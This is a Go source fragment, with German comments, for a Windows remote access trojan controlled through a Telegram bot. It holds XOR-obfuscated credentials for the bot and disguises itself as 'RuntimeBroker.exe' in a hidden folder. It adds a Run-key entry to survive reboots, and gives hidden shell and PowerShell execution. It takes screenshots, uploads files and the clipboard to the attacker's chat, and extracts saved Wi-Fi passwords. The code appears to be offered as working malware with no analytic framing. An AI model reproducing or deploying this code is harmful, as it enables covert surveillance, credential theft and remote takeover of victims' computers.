// ── Obfuskierte Credentials ────────────────────────────────────────────────────

var xk   = byte(TMPL_XOR_KEY)
var eapi = []byte{TMPL_ENC_API}
var etok = []byte{TMPL_ENC_TOKEN}
var ecid = []byte{TMPL_ENC_CHAT}

func xd(d []byte) string {
	r := make([]byte, len(d))
	for i, b := range d {
		r[i] = b ^ xk
	}
	return string(r)
}

var (
	apiBase = xd(eapi)
	tok     = xd(etok)
	cid     = xd(ecid)
	tgURL   = apiBase + tok + "/"
)

// ── Stealth: Relocation ────────────────────────────────────────────────────────
// Kopiert sich als legitim aussehende Windows-Datei und startet von dort.
// Task Manager zeigt dann "RuntimeBroker" statt zufälligen Dateinamen.

var installPath = os.ExpandEnv(`%LOCALAPPDATA%\Microsoft\Windows\RuntimeBroker.exe`)

func relocate() {
	exe, err := os.Executable()
	if err != nil {
		return
	}
	exe, _ = filepath.Abs(exe)
	target, _ := filepath.Abs(installPath)

	if strings.EqualFold(exe, target) {
		return // läuft bereits vom Zielort
	}

	data, err := os.ReadFile(exe)
	if err != nil {
		return
	}
	os.MkdirAll(filepath.Dir(target), 0755)
	if err := os.WriteFile(target, data, 0755); err != nil {
		return
	}

	// Ordner verstecken
	hideCmd := exec.Command("attrib", "+h", "+s", filepath.Dir(target))
	hideCmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}
	hideCmd.Run()

	// Neu starten vom Zielort
	newProc := exec.Command(target)
	newProc.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}
	newProc.Start()
	os.Exit(0)
}

// ── Telegram API ───────────────────────────────────────────────────────────────

var hc = &http.Client{Timeout: 60 * time.Second}

func post(method string, body interface{}) ([]byte, error) {
	data, _ := json.Marshal(body)
	resp, err := hc.Post(tgURL+method, "application/json", bytes.NewReader(data))
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

func send(text string) {
	if len(text) > 4000 {
		text = text[:3990] + "\n...[cut]"
	}
	post("sendMessage", map[string]interface{}{
		"chat_id": cid, "text": text, "parse_mode": "HTML",
	})
}

func sendFile(path string, asPhoto bool) error {
	f, err := os.Open(path)
	if err != nil {
		return err
	}
	defer f.Close()
	info, _ := f.Stat()
	if info.Size() > 49*1024*1024 {
		return fmt.Errorf("Datei zu groß (max 49 MB)")
	}
	var buf bytes.Buffer
	w := multipart.NewWriter(&buf)
	w.WriteField("chat_id", cid)
	field := "document"
	if asPhoto {
		field = "photo"
	}
	fw, _ := w.CreateFormFile(field, filepath.Base(path))
	io.Copy(fw, f)
	w.Close()
	resp, err := hc.Post(tgURL+"send"+strings.Title(field), w.FormDataContentType(), &buf)
	if err != nil {
		return err
	}
	resp.Body.Close()
	return nil
}

// ── Shell ──────────────────────────────────────────────────────────────────────

var workDir, _ = os.Getwd()

func shell(cmd string) string {
	c := exec.Command("cmd.exe", "/c", cmd)
	c.Dir = workDir
	c.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}
	out, err := c.CombinedOutput()
	s := strings.TrimSpace(string(out))
	if err != nil && s == "" {
		s = err.Error()
	}
	if s == "" {
		s = "[no output]"
	}
	return s
}

func ps(cmd string) string {
	c := exec.Command("powershell.exe", "-w", "h", "-nop", "-c", cmd)
	c.Dir = workDir
	c.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}
	out, _ := c.CombinedOutput()
	return strings.TrimSpace(string(out))
}

func esc(s string) string {
	s = strings.ReplaceAll(s, "&", "&amp;")
	s = strings.ReplaceAll(s, "<", "&lt;")
	s = strings.ReplaceAll(s, ">", "&gt;")
	return s
}

// ── Commands ───────────────────────────────────────────────────────────────────

func cmdSysinfo() string {
	host, _ := os.Hostname()
	user := os.Getenv("USERNAME")
	domain := os.Getenv("USERDOMAIN")
	priv := "User"
	if strings.Contains(shell("whoami /groups"), "S-1-16-12288") {
		priv = "🔑 Admin"
	}
	return fmt.Sprintf(
		"💻 <b>%s\\%s@%s</b> [%s]\n<code>OS:   %s/%s\nDir:  %s\nPID:  %d\nPath: %s</code>",
		domain, user, host, priv, runtime.GOOS, runtime.GOARCH,
		workDir, os.Getpid(), installPath,
	)
}

func cmdScreenshot() {
	path := os.TempDir() + fmt.Sprintf("\\~%d.png", time.Now().Unix())
	pscmd := fmt.Sprintf(
		`Add-Type -An System.Windows.Forms,System.Drawing;`+
			`$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;`+
			`$b=New-Object System.Drawing.Bitmap($s.Width,$s.Height);`+
			`$g=[System.Drawing.Graphics]::FromImage($b);`+
			`$g.CopyFromScreen(0,0,0,0,$s.Size);`+
			`$b.Save('%s')`, path,
	)
	ps(pscmd)
	if _, err := os.Stat(path); err != nil {
		send("❌ Screenshot fehlgeschlagen")
		return
	}
	if err := sendFile(path, true); err != nil {
		send("❌ Upload fehlgeschlagen: " + err.Error())
	}
	os.Remove(path)
}

func cmdDownload(path string) {
	if path == "" {
		send("❌ Verwendung: !download C:\\Pfad\\datei.txt")
		return
	}
	send(fmt.Sprintf("📤 Lade hoch: <code>%s</code>...", esc(path)))
	if err := sendFile(path, false); err != nil {
		send("❌ " + err.Error())
	}
}

func cmdClipboard() string {
	out := ps("Get-Clipboard")
	if out == "" {
		return "📋 Zwischenablage ist leer"
	}
	return "📋 <code>" + esc(out) + "</code>"
}

func cmdWifi() string {
	raw := shell("netsh wlan show profiles")
	var result strings.Builder
	result.WriteString("📶 <b>WLAN-Passwörter:</b>\n<code>")
	found := false
	for _, line := range strings.Split(raw, "\n") {
		if !strings.Contains(line, ":") {
			continue
		}
		if !strings.Contains(line, "All User Profile") && !strings.Contains(line, "Alle Benutzerprofile") {
			continue
		}
		parts := strings.SplitN(line, ":", 2)
		if len(parts) < 2 {
			continue
		}
		name := strings.TrimSpace(parts[1])
		pw := shell(fmt.Sprintf(`netsh wlan show profile name="%s" key=clear`, name))
		for _, l := range strings.Split(pw, "\n") {
			if strings.Contains(l, "Key Content") || strings.Contains(l, "Schlüsselinhalt") {
				pparts := strings.SplitN(l, ":", 2)
				if len(pparts) == 2 {
					result.WriteString(name + " : " + strings.TrimSpace(pparts[1]) + "\n")
					found = true
				}
			}
		}
	}
	result.WriteString("</code>")
	if !found {
		return "📶 Keine gespeicherten WLAN-Passwörter gefunden"
	}
	return result.String()
}

func cmdPersist() string {
	key := `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
	out := shell(fmt.Sprintf(`reg add "%s" /v "RuntimeBroker" /t REG_SZ /d "%s" /f`, key, installPath))
	if strings.Contains(out, "successfully") || strings.Contains(out, "erfolgreich") {
		return "✅ Persistenz eingerichtet — überlebt Neustart\n<code>HKCU\\Run\\RuntimeBroker → " + installPath + "</code>"
	}
	return "⚠️ <code>" + esc(out) + "</code>"
}

func cmdLs(path string) string {
	if path == "" {
		path = workDir
	}
	out := shell(`dir /a "` + path + `"`)
	return "<code>" + esc(out) + "</code>"
}

func cmdCd(path string) string {
	if path == "" {
		return "📁 <code>" + esc(workDir) + "</code>"
	}
	abs := path
	if !filepath.IsAbs(path) {
		abs = filepath.Join(workDir, path)
	}
	info, err := os.Stat(abs)
	if err != nil || !info.IsDir() {
		return "❌ Nicht gefunden: <code>" + esc(abs) + "</code>"
	}
	workDir = abs
	return "📁 <code>" + esc(workDir) + "</code>"
}

func cmdPs() string {
	out := shell("tasklist /fo csv /nh")
	var sb strings.Builder
	sb.WriteString("<code>")
	count := 0
	for _, line := range strings.Split(out, "\n") {
		if count >= 25 {
			sb.WriteString("...[+mehr → !shell tasklist]")
			break
		}
		fields := strings.Split(line, `","`)
		if len(fields) >= 2 {
			name := strings.Trim(fields[0], `"`)
			pid := strings.Trim(fields[1], `"`)
			sb.WriteString(fmt.Sprintf("%-28s %s\n", name, pid))
			count++
		}
	}
	sb.WriteString("</code>")
	return sb.String()
}

func cmdKill(arg string) string {
	if arg == "" {
		return "❌ Verwendung: !kill <PID>"
	}
	if _, err := strconv.Atoi(arg); err != nil {
		out := shell("taskkill /F /IM " + arg)
		return "<code>" + esc(out) + "</code>"
	}
	out := shell("taskkill /F /PID " + arg)
	return "<code>" + esc(out) + "</code>"
}

